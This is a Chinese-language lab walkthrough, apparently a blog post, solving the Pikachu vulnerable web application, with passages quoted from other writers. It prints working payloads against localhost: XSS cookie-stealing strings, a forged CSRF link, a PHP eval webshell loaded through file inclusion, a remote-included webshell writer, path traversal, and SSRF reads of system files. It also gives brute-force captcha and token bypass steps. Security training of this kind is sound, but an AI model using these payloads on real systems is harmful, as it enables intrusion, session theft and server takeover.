# Pikachu靶场汇总


pikachu靶场wp

<!--more-->

# 敏感信息泄露	

​	由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到。

 比如：
---通过访问url下的目录，可以直接列出目录下的文件列表;
---输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息;
---前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等;

### icanseeyourABC

![image-20230225105807763](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230225105807763.png)

​	F12，这题好没趣

# Burte Force

在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。

### 基于表单的暴力破解

burpsuite抓包发送到intruder直接开干

## 基于服务器的验证码绕过(On server)

![image-20230223175845314](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230223175845314.png)

验证码是cookie验证，可以伪造，而且，同一个验证码可以一直发包(burpsuite中的repeater发包验证)，同样是发送到intruder开干（有些服务器后台是不刷新验证码的，所以抓到包后不要放包，这样验证码就一直有效，把包发到攻击模块直接爆破）

![image-20230223180152304](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230223180152304.png)

burpsuite自带的密码字典包不是很受用，建议手动导入toop1000weak password开跑

![image-20230223180336196](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230223180336196.png)

### 基于前端的验证码绕过(on client)

这种将验证码的生成代码写在前端上是十分容易绕过的，单从网页的前端，关掉js功能就可以绕过，在burpsuite中重发包

![image-20230223184405931](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230223184405931.png)

验证码输入错误的情况下是不能抓包的，需先输入正确的验证码再抓包。然后再将数据包发送到爆破功能处，并且将验证码参数去除掉后再进行爆破

![image-20230223190812678](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230223190812678.png)

## 绕过Token暴力破解

**token的作用：**简单来说就是服务器给前端发的身份证，前端向服务器发送请求时都要带上这个身份证，服务器通过这个身份证来判断是否是合法请求

抓包发送给暴力破解模块，攻击类型选择pitchfork(音叉)，需爆破的内容为密码和token。

> 攻击类型为音叉的时候，例如你要爆破账号和密码，你的账号字典为123,456；你的密码字典为147,258。那么你爆破的次数就为2次了，分别是(123,147),(456,258)，也就是说账号字典和密码字典是一一对应的

![image-20230223192403277](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230223192403277.png)

有效荷载payload1是对密码的爆破，payload2是对token的爆破
对payload1的配置比较常规，从弱口令里面导入即可

在有效荷载payload2的选项中进行Grep-Extract配置如下图

![image-20230223192558940](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230223192558940.png)

点击添加：

![image-20230223192648608](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230223192648608.png)

在对payload2有效荷载的配置中，将payload类型改为递归匹配，并进行如下配置
递归匹配的选项选择第一个(刚在选项中配置的，并填入第一个payload(token))

![image-20230223193439546](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230223193439546.png)



资源池要使用单线程(没有的话，在下面添加)：

![image-20230223193342655](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230223193342655.png)

开始攻击，成功界面：

![image-20230223193221377](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230223193221377.png)

# Cross Site Request Forgery

Cross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为"one click"攻击。 

### CSRF(get)

按F12根据提示登录账号并进入个人页面点击修改个人信息
随后开启burp并提交表单进行抓包，抓取用户点击submit提交时的连接并构造payload，如下：

```
http://127.0.0.1/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&phonenum=18626545453&add=chain&email=111&submit=submit%20HTTP/1.1
```

当用户点击此链接时，邮箱就会被改为111

### CSRF(post)

在submit之前开始抓包，抓取提交表单的连接，右键单击，选中Engagement tools中的Generate CSRF POC，生成了一个CSRF的POC可用于检测页面是否存在CSRF漏洞

<img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230224163912631.png" alt="image-20230224163912631"  />

在CSRF PoC中的CSRF HTML栏进行修改，随后点击最下面一栏的用浏览器测试

![image-20230224164057055](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230224164057055.png)

复制该连接，当用户访问该链接时，个人信息内容便会被修改

### CSRF Token

造成CSRF漏洞的主要原因是请求敏感操作的数据包容易被伪造,如果在每次请求时都增加一个随机码(`Token`), 在每次前端与后端进行数据交互时后台都要对这个随机码进行验证, 以此来防护CSRF攻击

# Cross Site Scripting

Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写"CSS"冲突，故又称XSS。一般XSS可以分为如下几种常见类型：
 	 1.反射性XSS;
  	2.存储型XSS;
​	  3.DOM型XSS;

​	XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。
形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。

​	在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:
 输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;
 输出转义：根据输出点的位置对输出到前端的内容进行适当转义;

​	XSS测试流程
1、在目标上找输入点，比如查询接口、留言板
2、 输入一组 “特殊字符（>，’，"等）+唯一识别字符” ，点击提交后，查看返回源码，看后端返回的数据是否有处理
3、通过搜索定位到唯一字符，结合唯一字符前后语法确定是否可以构造执行js的条件（构造闭合）
4、 提交构造的脚本代码（以及各种绕过姿势），看是否可以成功执行，如果成功执行则说明存在XSS漏洞

### 反射型xss(get)

![image-20230223200818737](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230223200818737.png)

蓝色框中包含对文本框最大长度的限制，可进行修改
随后输入xss弹框代码：

```
<script>alert(1)</script>
```

Xss回显：

![image-20230223201000196](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230223201000196.png)

### 反射性xss(post)

先登录，再输入弹cookie的Xss代码，爆破比较常规

![image-20230223201556547](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230223201556547.png)

```
<script>alert(document.cookie)</script>
```

回显：

![image-20230223201543480](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230223201543480.png)

### 存储型xss

![image-20230223201950367](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230223201950367.png)



![image-20230223201907996](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230223201907996.png)

### Dom型Xss

Dom型xss，就是向文档对象传入xss代码参数，然后操作文档对象时就会触发xss攻击。DOM型xss是比较特殊的，产生DOM型xss的原因是DOM获取到了前端的输入并载入到DOM节点中作为输出，**相比与反射型和存储型，它是不与后端交互的**

分析一下前端网页代码，可以发现输入框里的参数会被传递给A标签的href属性

![image-20230223204807882](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230223204807882.png)

点击按钮后，输入框参数被传到a标签的href属性，只要将href属性弄成xss代码，即可触发xss

![image-20230223204437470](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230223204437470.png)

下面摘取大佬的写的wp(验证过程)：

> 1.先检测一下输入输出，输入 123 ,查看页面
>
> ![image-20230223205527857](https://img-blog.csdnimg.cn/20201008101503655.png#pic_center)
>
> 2.可以看到，页面中出现了双引号，需要进行闭合，输入 123" οnclick=alert(1) ，再查看源代码。
>
> ![image-20230223205527857](https://img-blog.csdnimg.cn/20201008101516135.png#pic_center)
>
> 3.再继续进行输入检测，输入 123" οnclick=alert(1) <> ’ " ，出现如下结果
>
> ![image-20230223205527857](https://img-blog.csdnimg.cn/20201008101531188.png#pic_center)
>
> 4.输入 `123" οnclick=alert(1) <> ’ ，`
>
> ![image-20230223205527857](https://img-blog.csdnimg.cn/20201008101547855.png#pic_center)
>
> 5.看得有点迷糊，但是可以发现，双引号被当成了普通的字符串，而单引号却没有，甚至，会在单引号前边自动加上一个双引号。
>
> 6.审查一下源代码
>
> ```
> <div id="xssd_main">
>  <script>
>      function domxss(){
>      var str = document.getElementById("text").value;
>      //通过id获取到输入框中的值，并赋值给str
>      document.getElementById("dom").innerHTML = "<a href='"+str+"'>what do you see?</a>";
>      //在id=“dom”的起止标签中间插入一个<a>标签，并将输入框中获取到的字符串拼接到<a>标签里面
>      //所以，要想闭合，实际上需要用的是单引号
>      //123" οnclick=alert(1) <> '    <a href='123" onclick=alert(1) <> ''>what do you see?</a>
>      }
>      //试试：'><img src="#" οnmοuseοver="alert('xss')">
>      //试试：' οnclick="alert('xss')">,闭合掉就行    
>  </script>
>  <!--<a href="" onclick=('xss')>-->
>  <input id="text" name="text" type="text"  value="" />
>  <input id="button" type="button" value="click me!" onclick="domxss()" />
>  <div id="dom"></div>
> </div>
> ```
>
> 7.使用单引号闭合，或者是使用JavaScript伪协议，输入 `javascript:alert(1)`,至于更深层次的利用方法，现在暂时不了解，留待学习JavaScript后加强

### DOM型xss-X

单纯解题角度，无非是比上一题要多点一下
抄抄大佬的分析：

> 按照上一关的方法直接就成功了，而且测试了一下，闭合单引号以后，后边的双引号是可以正常使用的。
> 输入 #’ οnclick=“alert(‘1’)”>
>
> ![img](https://img-blog.csdnimg.cn/2020100810161010.png#pic_center)
>
> 但还是来审查一波源代码，走一个流程。这个程序的执行，总共有着三个步骤。
> 1.在输入框中输入数据，点下按钮，表单以get方式提交，但明没有页面跳转，仅是将数据加载到url中
>
> ```
> <form method="get">
>  <input id="text" name="text" type="text"  value="" />
>  <input id="submit" type="submit" value="请说出你的伤心往事"/>
> </form>
> ```
>
> 2.下面一段代码检测，url中是否设置了“text参数”，如果设置了，就会在页面中增加一个超链接的DOM节点。
>
> ```
> $html='';
> if(isset($_GET['text'])){
>  $html.= "<a href='#' οnclick='domxss()'>有些费尽心机想要忘记的事情,后来真的就忘掉了</a>";
> }
> ```
>
> ![img](https://img-blog.csdnimg.cn/20201008101628759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDE3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center)
>
> 3.点击超链接，触发onclick事件，调用domxss()函数。读取url后的参数，截取除“?text=”的部分，并解码，再使用正则表达式将url中出现的\全局替换为空格，最后将得出的payload拼接到标签中。
>
> - **Location.search**
>
>   Location的search属性是一个可读可写的字符串，可设置或返回当前 URL 的查询部分（问号?之后的部分）。
>
> - **decodeURIComponent**
>
>   对 encodeURIComponent() 函数编码的 URI 进行解码
>
> - **string.split(separator,limit)**
>
>   separator 可选。字符串或正则表达式，从该参数指定的地方分割 string Object。
>
>   limit 可选。该参数可指定返回的数组的最大长度。如果设置了该参数，返回的子串不会多于这个参数指定的数组。如果没有设置该参数，整个字符串都会被分割，不考虑它的长度。
>
> 
>
>   原文链接：https://blog.csdn.net/weixin_44178492/article/details/108959980
>
> ```
> <script>
>     function domxss()
>     {
>         var str = window.location.search;
>         var txss = decodeURIComponent(str.split("text=")[1]);
>         var xss = txss.replace(/\+/g,' ');
> //alert(xss);
> 
>         document.getElementById("dom").innerHTML = "<a href='"+xss+"'>就让往事都随风,都随风吧</a>";
>     }
>     //试试：'><img src="#" onmouseover="alert('xss')">
>     //试试：' οnclick="alert('xss')">,闭合掉就行
> </script>
> ```
>
> ![image-20230223210529004](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230223210529004.png)

![image-20230223213039669](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230223213039669.png)

#### **不得不说，chatgpt分析代码真好用啊**

### xss之盲打

输入内容提交，发现没回显，直接dirsearch扫描一下后台，可得到后台登录地址

```
http://127.0.0.1/vul/xss/xssblind/admin_login.php
```

随后bp爆破进入，可看到历次提交的内容，就此，我们可以尝试提交xss语句，刷新后台页面，有回显

![image-20230223221635425](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230223221635425.png)

### Xss之过滤

看一下源代码

```
if(isset($_GET['submit']) && $_GET['message'] != null){
    //这里会使用正则对<script进行替换为空,也就是过滤掉
    $message=preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/', '', $_GET['message']);
//    $message=str_ireplace('<script>',$_GET['message']);
```

过滤掉了`<script`字段 ，可以尝试大小写绕过

```
<Script>alert(document.cookie)</sCript>
```

当然其他语句是不受影响的

```
<img src='x' onerror='alert(document.cookie)'>
```

### xss之htmlspecialchars

htmlspecialchars() 函数把一些预定义的[字符](https://baike.baidu.com/item/字符/4768913?fromModule=lemma_inlink)转换为 HTML 实体。语法为：htmlspecialchars(string,quotestyle,character-set)

specialchars这个函数就是把单引号，双引号，尖括号过滤了，但是这个函数默认是不过滤单引号的，只有将quotestyle选项为ENT_QUOTES才会过滤单引号。

所以用`javascript:alert(document.cookie)`就可以绕过

![image-20230223230809307](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230223230809307.png)

### xss之href输出

此关，同时使用了htmlspecialchars并且使用了ENT_QUOTES参数

ENT_COMPAT - 默认，仅编码双引号。
ENT_QUOTES - 编码双引号和单引号。
ENT_NOQUOTES - 不编码任何引号。
看源码

```
$message=htmlspecialchars($_GET['message'],ENT_QUOTES);
```

所以，使用单引号是无法进行绕过的，只能使用JavaScript伪协议了。

```
javascript:alert(document.cookie)
```

### xss之js输出

看源代码，这段判断提交的参数并获取，如果参数值为“tmac”，则输出一张图片

```
if(isset($_GET['submit']) && $_GET['message'] !=null){
    $jsvar=$_GET['message'];
//    $jsvar=htmlspecialchars($_GET['message'],ENT_QUOTES);
    if($jsvar == 'tmac'){
        $html.="<img src='C:\Blog\source\_posts\{$PIKA_ROOT_DIR}assets\images\nbaplayer\tmac.jpeg' />";
    }
}
```

下面这段：

```
<script>
    $ms='<?php echo $jsvar;?>';
    if($ms.length != 0){
        if($ms == 'tmac'){
            $('#fromjs').text('tmac确实厉害,看那小眼神..')
        }else {
//            alert($ms);
            $('#fromjs').text('无论如何不要放弃心中所爱..')
        }

    }

</script>
//这里将输入动态的生成到了js中,形成xss
//javascript里面是不会对tag和字符实体进行解释的,所以需要进行js转义

//讲这个例子主要是为了让你明白,输出点在js中的xss问题,应该怎么修复?
//这里如果进行html的实体编码,虽然可以解决XSS的问题,但是实体编码后的内容,在JS里面不会进行翻译,这样会导致前端的功能无法使用。
//所以在JS的输出点应该使用\对特殊字符进行转义
```

则构造payload如下：

```
</script><script>alert(1)</script>
```

# File Inclusion

​	**文件包含**是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 

比如 在PHP中，提供了：
include(),include_once()
require(),require_once()

​	大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 若文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况：
​	**1.本地文件包含漏洞：**仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。
​	**2.远程文件包含漏洞：**能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。

因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。

### File Inclusion(local)

#### 原理

仅对服务器本地的文件进行包含, 由于服务器上的文件并不是攻击者所能控制得, 因此在攻击的过程中更多的是包含系统的配置文件(如密钥文件), 或者配合文件上传漏洞去形成更大的威力

#### 

通过get传参，file伪协议，直接对payload进行修改

![image-20230224193405000](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230224193405000.png)

再举一个栗子，这里我摘取一下charmersix师傅的笔记：

> 我们在目录下新建个txt,一会通过web页面读它![image-20221120162939127](https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211201629180.png)
>
> 然后我们直接在url里输入目录就可以![image-20221120163110337](https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211201631389.png)
>
> 

在CSDN看到了大佬写的笔记，觉得在理解本地文件包含上大有益俾，赶紧抄一抄：

出自[Henry404s](https://blog.csdn.net/xf555er?type=blog)师傅

> #### 访问任意文件
>
> 在当前网页所在的文件目录有一个file6.php文件
>
> ![image-20221128181419526](https://img-blog.csdnimg.cn/img_convert/1a22a967d435d240097ff201412ccdb4.png)
>
> 读取file6.php文件内容:`http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=file6.php&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2`
>
> ![1](https://img-blog.csdnimg.cn/img_convert/73cd5ecc8b89a972d15ca58e029d5359.gif)
>
> #### 配合文件上传getshell
>
> 使用imgTrjs工具将一句话代码写入图片中
>
> ```
> <?php @eval($_POST['123']);?>
> ```
>
> ![image-20221128192307249](https://img-blog.csdnimg.cn/img_convert/ccea7f91a8a4c6f684917abf2c3d7121.png)
>
> 在文件上传处上传带有恶意代码的图片, 随后返回图片的相对路径:`uploads/ImgTrjs.jpg`
>
> ![动画](https://img-blog.csdnimg.cn/img_convert/d42dacf5ecdf84493f9ac5bbd398766c.gif)
>
> 包含不存在的文件导致报错:`http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=file7.php&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2`
>
> 从报错信息可看出文件包含函数用的是include(), 被包含的文件路径为`pikachu\vul\fileinclude\include\file7.php`
>
> ![image-20221128193653147](https://img-blog.csdnimg.cn/img_convert/c652cdd601f739ae46b3e582c87bdd71.png)
>
> 由于文件处于`/include`目录下, 故不能使用绝对路径, 需转换成相对路径, 最终包含木马图片的payload如下
>
> ```
> http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/ImgTrjs.jpg&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
> ```
>
> ![image-20221128195624830](https://img-blog.csdnimg.cn/img_convert/757c61d06a06f528f95a13f448a6d351.png)
>
> 使用蚁剑连接webshell, 连接url地址为:`http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/ImgTrjs.jpg&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2`, 连接密码为123
> ![1](https://img-blog.csdnimg.cn/img_convert/8083d88d72107f015f0c92d6792f6888.gif)

### File inclusion(Remote)

#### 原理

能通过url地址对远程的文件进行包含, 这也意味着攻击者可以传入任意的代码

与此同时远程包含漏洞还能包含本地文件的绝对路径或相对路径

远程文件包含涉及到两个配置选项
allow_url_fopen = On 是否允许打开远程文件
allow_url_include = On 是否允许include/require远程文件

同样摘取[Henry404s](https://blog.csdn.net/xf555er?type=blog)师傅的文章：

> #### 远程生成Webshell
>
> 首先生成一个文本文件部署在服务器上，这里为了测试方便，我选择放在phpstudy的根目录下，文件内容为
>
> ```
> <?php fputs(fopen('shell.php','w'),'<?php @eval($_POST[123]);?>');?>
> ```
>
> 文件的url地址为
>
> ```
> http://127.0.0.1/GenerateWebshell.txt
> ```
>
> ![1](https://img-blog.csdnimg.cn/img_convert/c1c204b4fbcd26ba0c5d072d7f562ce3.png)
>
> 最终构成的远程包含payload为`http://127.0.0.1/pikachu/vul/fileinclude/fi_remote.php?filename=http://127.0.0.1/GenerateWebshell.txt&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2`
> 网页访问该payload后会在`fi_remote.php`的同级目录下生成shell.php文件, 后续可用蚁剑进行连接
>
> ![动画](https://img-blog.csdnimg.cn/img_convert/99cf82674dc86e9438feabddf39845d4.gif)

# Over Permission

​	如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作。 越权漏洞形成的原因是后台使用了 不合理的权限校验规则导致的。

​	一般**越权漏洞**容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对 对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。

​	越权漏洞又分为水平越权和垂直越权:

- 水平越权: A用户和B用户属于同一级别的用户, 但各自都不能操作对方的个人信息。若A用户能够越权操作B用户的个人信息, 这种情况我们称之为"水平越权"
- 垂直越权: A用户权限高于B用户, B用户能对A用户进行操作的情况称为"垂直越权"

### 水平越权

![image-20230225093701696](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230225093701696.png)

​	根据提示，登录lili的账号，进入查看个人信息页面，通过修改url，可查看并更改kobe，lucy的信息，存在水平越权漏洞

​	本关涉及到两个页面，一个是登录页面，另一个是用户信息的页面,而越权漏洞出现在查看用户信息的页面中，在进行校验时，仅校验了传进来的username，导致了漏洞

![image-20230225094049904](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230225094049904.png)

### 垂直越权

​	两个账号，一个是admin(高权限),另一个是pikachu(低权限)，在进行登录时会有两个数据包，第一个是登录的数据包，第二个是请求页面的数据包

此处摘取Henry404s师傅的分析：

> **通过源代码分析流程**
> 1.首先是登录页面，用户提交信息，脚本从数据库中进行查询，对应的表中总共有3个字段，username，password，level，查询到数据之后，对level的值进行校验，然后签发session，并跳转到不同的页面。
>
> ```
> $html="";
> if(isset($_POST['submit'])){
>  if($_POST['username']!=null && $_POST['password']!=null){
>      $username=escape($link, $_POST['username']);
>      $password=escape($link, $_POST['password']);//转义，防注入
>      $query="select * from users where username='$username' and password=md5('$password')";
>      $result=execute($link, $query);
>      if(mysqli_num_rows($result)==1){
>          $data=mysqli_fetch_assoc($result);
>          if($data['level']==1){//如果级别是1，进入admin.php
>              $_SESSION['op2']['username']=$username;
>              $_SESSION['op2']['password']=sha1(md5($password));
>              $_SESSION['op2']['level']=1;
>              header("location:op2_admin.php");
>          }
>          if($data['level']==2){//如果级别是2，进入user.php
>              $_SESSION['op2']['username']=$username;
>              $_SESSION['op2']['password']=sha1(md5($password));
>              $_SESSION['op2']['level']=2;
>              header("location:op2_user.php");
>          }
> 
>      }else{
>          //查询不到，登录失败
>          $html.="<p>登录失败,请重新登录</p>";
> 
>      }
> 
>  }
> 
> 
> 
> }
> ```
>
> 2.接着是管理员页面，管理员页面中只要提交了id参数就可以完成一次删除操作，但是，此处校验较为严格，不存在越权漏洞。(至少我找不到)
>
> ```
> $link=connect();
> // 判断是否登录，没有登录不能访问
> //如果没登录，或者level不等于1，都就干掉
> if(!check_op2_login($link) || $_SESSION['op2']['level']!=1){
>  header("location:op2_login.php");
>  exit();
> }
> 
> //删除
> if(isset($_GET['id'])){
>  $id=escape($link, $_GET['id']);//转义
>  $query="delete from member where id={$id}";
>  execute($link, $query);
> }
> 
> 
> if(isset($_GET['logout']) && $_GET['logout'] == 1){
>  session_unset();
>  session_destroy();
>  setcookie(session_name(),'',time()-3600,'/');
>  header("location:op2_login.php");
> 
> }
> 
> ```
>
> 3.来到添加用户的页面,可以看到，相比于管理员页面的校验，此处缺少了对权限等级的校验，于是产生了越权。
>
> ```
> $link=connect();
> // 判断是否登录，没有登录不能访问
> //这里只是验证了登录状态，并没有验证级别，所以存在越权问题。
> if(!check_op2_login($link)){
>  header("location:op2_login.php");
>  exit();
> }
> if(isset($_POST['submit'])){
>  if($_POST['username']!=null && $_POST['password']!=null){//用户名密码必填
>      $getdata=escape($link, $_POST);//转义
>      $query="insert into member(username,pw,sex,phonenum,email,address) values('{$getdata['username']}',md5('{$getdata['password']}'),'{$getdata['sex']}','{$getdata['phonenum']}','{$getdata['email']}','{$getdata['address']}')";
>      $result=execute($link, $query);
>      if(mysqli_affected_rows($link)==1){//判断是否插入
>          header("location:op2_admin.php");
>      }else {
>          $html.="<p>修改失败,请检查下数据库是不是还是活着的</p>";
> 
>      }
>  }
> 
> }
> 
> 
> if(isset($_GET['logout']) && $_GET['logout'] == 1){
>  session_unset();
>  session_destroy();
>  setcookie(session_name(),'',time()-3600,'/');
>  header("location:op2_login.php");
> 
> }
> ------------------------------------------------------------------------------------------------------------------------------------------
> 
> //此处涉及到校验是否登录的函数。  
> function check_op2_login($link){
>  if(isset($_SESSION['op2']['username']) && isset($_SESSION['op2']['password'])){
>      $query="select * from users where username='{$_SESSION['op2']['username']}' and sha1(password)='{$_SESSION['op2']['password']}'";
>      $result=execute($link,$query);
>      if(mysqli_num_rows($result)==1){
>          return true;
>      }else{
>          return false;
>      }
>  }else{
>      return false;
>  }
> }
> 
> ```
>

# Path-traversal

​	在web功能设计中,很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。 当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。 在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过“../”这样的手段让后台打开或者执行一些其他的文件。 从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。

### 目录遍历

任意输入一个title值，爆出当前目录
![image-20230225104449624](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230225104449624.png)



随后对url中的payload进行修改即可实现目录遍历

![image-20230225104116868](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230225104116868.png)

例如：

```
http://127.0.0.1/vul/dir/dir_list.php?title=../../../README.md
```

![image-20230225104724497](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230225104724497.png)

# Remote Commandcode Execute

​	RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。

​	分为**远程代码执行**和**远程系统命令执行**

> **远程系统命令执行**
> 	一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口，比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上
> 一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器
>
> **远程代码执行**
> 	同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。

### exec"ping"

查看rce_ping源码文件, 可发现`$_POST['ipaddress']`变量未经任何安全处理就传给了`$ip`, 由此造成了远程命令执行漏洞

![img](https://img-blog.csdnimg.cn/img_convert/802b312d9b68b61a118ca763eb25efea.png)



![image-20230224183540414](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230224183540414.png)

### exec "eval"

查看源码可知，`$POST['txt']`未经任何过滤处理就作为`eval`函数的参数, 由此造成远程代码执行漏洞

![image-20230224184135516](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230224184135516.png)



输入`phpinfo();`,得到回显
![image-20230224184358955](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230224184358955.png)

# Server-Side Request Forgery

​	**服务器端请求伪造**,其形成的原因大都是由于服务端**提供了从其他服务器应用获取数据的功能**,但又没有对目标地址做严格过滤与限制,导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据

​	**数据流:攻击者----->服务器---->目标地址**

```
PHP中下面函数的使用不当会导致SSRF:
file_get_contents()
fsockopen()
curl_exec()    
```

​	如果一定要通过后台服务器远程去对用户指定("或者预埋在前端的请求")的地址进行资源请求,**则请做好目标地址的过滤**。

​	查看一下源代码：![image-20230225143142160](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230225143142160.png)

源码中阐述了：curl支持很多协议，比如FTP,FTPS,HTTP,HTTPS,GOPHER,TELNET,DICT,FILE等协议

![image-20230225143356626](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230225143356626.png)

我本地环境里的ssrf打不开了，这里摘取charmersix的笔记：

> 我们也可以效仿上上个漏洞,通过file协议读取一些我们想要的文件
>
> ![image-20221228191611449](https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202212281916505.png)

### SSRF(file_get_contents)

​	`	file_get_contents()` 函数是PHP中用于读取文件内容的内置函数之一。它以字符串形式返回指定文件的全部内容。

​	我的本地环境报了个奇怪的错误，这里先引用一下Henry404s师傅的笔记：

> ​	file_get_contents() 把整个文件读入一个字符串中。
>
> ```
> //读取PHP文件的源码:php://filter/read=convert.base64-encode/resource=ssrf.php
> //内网请求:http://x.x.x.x/xx.index
> if(isset($_GET['file']) && $_GET['file'] !=null){
>  $filename = $_GET['file'];
>  $str = file_get_contents($filename);
>  echo $str;
> }
> ```
>
> ​	由于使用的函数不一样了，利用方法也就不同了，这里，探测端口似乎不再灵验，但是依然可以实现文件的读取
>
> ```
> http://192.168.1.101/pikachu/vul/ssrf/ssrf_fgc.php ?file=file:///C:/Windows/System32/drivers/etc/hosts   
> ```
>
> ![img-N3ZQUIVX-1602122701626](https://img-blog.csdnimg.cn/2020100810351290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDE3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center)
>
